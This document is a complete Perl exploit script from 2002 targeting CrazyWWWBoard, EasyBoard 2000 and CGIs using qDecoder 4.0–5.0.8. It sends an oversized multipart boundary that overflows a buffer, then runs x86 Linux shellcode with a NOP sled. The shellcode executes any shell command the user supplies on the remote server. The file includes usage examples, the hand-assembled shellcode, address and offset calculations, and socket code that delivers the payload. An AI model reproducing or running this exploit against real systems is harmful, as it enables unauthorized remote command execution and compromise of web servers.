#!/usr/bin/perl
# ez2crazy.pl
#
# Remote Buffer Overflow x86 Linux Exploit for
#    CrazyWWWBoard(http://www.crazywwwboard.com),
#    EasyBoard 2000(http://ezboard.new21.org) and
#    CGIs using qDecoder 4.0~5.0.8
#
# Excessive boundary delimiter string in the header
# "Content-Type: multipart/form-data" permits the buffer overflow attack.
#
# Programmed by Jin Ho You, jhyou@chonnam.chonnam.ac.kr, 2002/02/11

$usage =
"usage: ez2crazy.pl [options] CGI-URL\n
  CGI-URL        URL of the target CGI
  -c command     Bourne shell command
                 Default: '/bin/echo 00ps, Crazy!;id'
  -o offset      Offset of the egg shell code,
                 Recommended [-300,+300]

example)
  ez2crazy.pl http://target.com:8080/cgi-bin/vulnerable.cgi
  ez2crazy.pl -o -47 target.com/cgi-bin/vulnerable.cgi
  ez2crazy.pl -c 'echo vulnerable.cgi has a security hole! | mail root' \\
           target.com/cgi-bin/vulnerable.cgi

";

use Getopt::Std;
getopt('oc');

if ($#ARGV < 0) {
    print $usage;
    exit(0);
};

$cgiurl = $ARGV[0];
$command = $opt_c ? $opt_c : "/bin/echo 00ps, Crazy!;id";
$offset = $opt_o ? $opt_o : 0;


$cgiurl =~ s/http:\/\///;
($host, $cgiuri) = split(/\//, $cgiurl, 2);
($host, $port) = split(/:/, $host);
$port = 80 unless $port;

$command = "/bin/echo Content-Type: text/html;/bin/echo;($command)";
$cmdlen = length($command);

$argvp = int((0x0b + $cmdlen) / 4) * 4 + 4;
$shellcode =
  "\xeb\x37"                            # jmp 0x37
. "\x5e"                                # popl %esi
. "\x89\x76" . pack(C, $argvp)          # movl %esi,0xb(%esi)
. "\x89\xf0"                            # movl %esi,%eax
. "\x83\xc0\x08"                        # addl $0x8,%eax
. "\x89\x46" . pack(C, $argvp + 4)      # movl %eax,0xb(%esi)
. "\x89\xf0"                            # movl %esi,%eax
. "\x83\xc0\x0b"                        # addl $0xb,%eax
. "\x89\x46" . pack(C, $argvp + 8)      # movl %eax,0xb(%esi)
. "\x31\xc0"                            # xorl %eax,%eax
. "\x88\x46\x07"                        # movb %eax,0x7(%esi)
. "\x4e"                                # dec %esi
. "\x88\x46\x0b"                        # movb %eax,0xb(%esi)
. "\x46"                                # inc %esi
. "\x88\x46" . pack(C, 0x0b + $cmdlen)  # movb %eax,0xb(%esi)
. "\x89\x46" . pack(C, $argvp + 12)     # movl %eax,0xb(%esi)
. "\xb0\x0b"                            # movb $0xb,%al
. "\x89\xf3"                            # movl %esi,%ebx
. "\x8d\x4e" . pack(C, $argvp)          # leal 0xb(%esi),%ecx
. "\x8d\x56" . pack(C, $argvp + 12)     # leal 0xb(%esi),%edx
. "\xcd\x80"                            # int 0x80
. "\x31\xdb"                            # xorl %ebx,%ebx
. "\x89\xd8"                            # movl %ebx,%eax
. "\x40"                                # inc %eax
. "\xcd\x80"                            # int 0x80
. "\xe8\xc4\xff\xff\xff"                # call -0x3c
. "/bin/sh0-c0"                         # .string "/bin/sh0-c0"
. $command;

$offset -= length($command) / 2 + length($host . $port . $cgiurl);
$shelladdr = 0xbffffbd0 + $offset;
$noplen = 242 - length($shellcode);
$jump = $shelladdr + $noplen / 2;
$entries = $shelladdr + 250;
$egg = "\x90" x $noplen . $shellcode . pack(V, $jump) x 9
        . pack(V, $entries) x 2 . pack(V, $jump) x 2;

$content = substr($egg, 254) .
  "--\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n0\r\n--$egg--\r\n";
$contentlength = length($content);

$exploit =
"POST /$cgiuri HTTP/1.0
Connection: Keep-Alive
User-Agent: Mozilla/4.72 [ko] (X11; I; Linux 2.2.14 i686)
Host: $host:$port
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: ko
Accept-Charset: euc-kr,*,utf-8
Content-type: multipart/form-data; boundary=$egg
Content-length: $contentlength

$content
";

use Socket;
$iaddr = inet_aton($host) or die("Error: $!\n");
$paddr = sockaddr_in($port, $iaddr) or die("Error: $!\n");
$proto = getprotobyname('tcp') or die("Error: $!\n");

socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die("Error: $!\n");
connect(SOCKET, $paddr) or die("Error: $!\n");
send(SOCKET, $exploit, 0) or die("Error: $!\n");
while (<SOCKET>) {
    print;
}
close(SOCKET);
